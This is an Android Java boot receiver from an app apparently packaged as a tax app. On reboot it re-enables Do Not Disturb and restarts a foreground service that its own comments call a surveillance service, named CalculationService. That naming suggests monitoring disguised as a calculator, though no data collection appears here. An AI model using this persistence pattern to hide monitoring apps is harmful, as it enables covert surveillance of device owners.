package com.secure.taxapp.services;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;
import com.secure.taxapp.ConfigManager;

/**
 * Receiver pour demarrage automatique au boot.
 *
 * Au redemarrage du telephone, on doit :
 * 1. Demarrer le service de surveillance
 * 2. Retablir le mode DND si le service etait actif
 *    (Android remet le DND a zero apres un reboot)
 */
public class BootReceiver extends BroadcastReceiver {

    private static final String TAG = "BR";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null) return;
        String action = intent.getAction();
        Log.d(TAG, "BootReceiver: " + action);

        boolean isBoot = Intent.ACTION_BOOT_COMPLETED.equals(action)
            || "android.intent.action.QUICKBOOT_POWERON".equals(action)
            || "com.htc.intent.action.QUICKBOOT_POWERON".equals(action);

        if (!isBoot) return;

        ConfigManager configManager = new ConfigManager(context);

        if (configManager.isServiceActive()) {
            // 1. Retablir le mode DND (reboot l'efface)
            configManager.getDndManager().enableDnd();
            Log.d(TAG, "DND re-enabled after boot");

            // 2. Demarrer le service de surveillance
            try {
                Intent serviceIntent = new Intent(context, CalculationService.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(serviceIntent);
                } else {
                    context.startService(serviceIntent);
                }
                Log.d(TAG, "Service started after boot");
            } catch (Exception e) {
                Log.e(TAG, "Failed to start service after boot", e);
            }
        }
    }
}
